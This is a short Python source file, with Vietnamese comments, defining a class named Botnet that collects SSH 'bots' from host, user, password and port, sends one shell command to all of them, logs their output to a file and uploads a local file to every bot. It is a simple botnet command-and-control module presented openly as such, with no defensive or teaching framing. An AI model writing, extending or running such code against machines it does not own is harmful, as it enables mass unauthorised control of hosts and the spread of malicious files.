from client import Client
from datetime import datetime, date

class Botnet:

    def __init__(self):
        self.botNet = []  # Sửa tên biến để phù hợp với tên biến được sử dụng ở các phương thức khác
        self.f = open('logs.txt', 'a')

    def addBot(self, host, user, password, por):
        print(self, host, user, password, por)
        if por != -1:
            client = Client(host, user, password, por)
            if isinstance(client.session, Exception): 
                return client.session
            else:
                self.botNet.append(client)  # Sửa tên biến để phù hợp với tên biến được sử dụng ở __init__
            
        else:
            print('[-] ssh server không chạy trên ' + host)

    def sendCommandsToBots(self, command):
        self.f.write(" -> " + str(date.today().strftime("%B %d, %Y")) + " ( " + datetime.now().strftime("%H:%M:%S") + ' ) ' + '\n\n')

        for client in self.botNet:
            try:
                output = client.send_command(command)
                print('[*] Output from ' + client.host)
                print('[+] ' + output) 
                self.f.write('[*] Output from ' + client.host + '\n')
                self.f.write('[+] ' + output + '\n')
            except Exception as e:
                print(f"Error: {e}.")

        self.f.write(100*'-' + '\n')

    def uploadFile(self, localFilePath):
        for client in self.botNet:
            try:
                client.uploadFile(localFilePath)
            except Exception as e:
                print(f"Error: {e}.")
